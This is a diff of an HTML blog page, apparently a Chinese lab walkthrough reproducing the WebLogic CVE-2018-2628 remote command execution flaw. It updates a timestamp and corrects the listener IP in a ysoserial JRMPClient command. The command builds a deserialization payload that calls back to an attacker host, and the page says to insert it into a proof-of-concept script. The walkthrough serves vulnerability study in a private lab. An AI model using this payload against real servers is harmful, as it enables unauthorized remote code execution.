@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/TTD%7D@XT1F8VGNLK5X86Z8%299.png">
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/M%7DP%25@Y4@TJ%604739%7D49W%255BJ.png">
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/9M%7D02~B~XBPZS%5BG3PP5_896.png">
-<meta property="og:updated_time" content="2018-04-23T03:26:03.845Z">
+<meta property="og:updated_time" content="2018-05-08T01:54:32.281Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CVE-2018-2628 远程命令执行漏洞复现">
 <meta name="twitter:description" content="环境介绍攻击机：kalilinux  ysoserial-master IP：192.168.3.178 
@@ -202,7 +202,7 @@
 <a id="more"></a>
 <h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>首先下载配置靶机环境，使其192.168.3.194:7001可以访问，然后将cc.py和ysoserial下载并移植到kali linux。</p>
 <p>然后用ysoserial 生成payload，IP地址填入你的kali IP地址，监听端口 1099</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>ysoserial-master.<span class="keyword">jar </span><span class="keyword">JRMPClient </span><span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">194</span>:<span class="number">1099</span><span class="title">|xxd</span></div></pre></td></tr></table></figure>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>ysoserial-master.<span class="keyword">jar </span><span class="keyword">JRMPClient </span><span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">178</span>:<span class="number">1099</span><span class="title">|xxd</span></div></pre></td></tr></table></figure>
 <p>将其生成的payload的byte取出，替换掉poc中的payload</p>
 <p>生成的payload：</p>
 <p><img src="http://oo1re7zx4.bkt.clouddn.com/ZK%60KYAJRXB%25K2BC%5D%5DE%5BH485.png" alt=""></p>
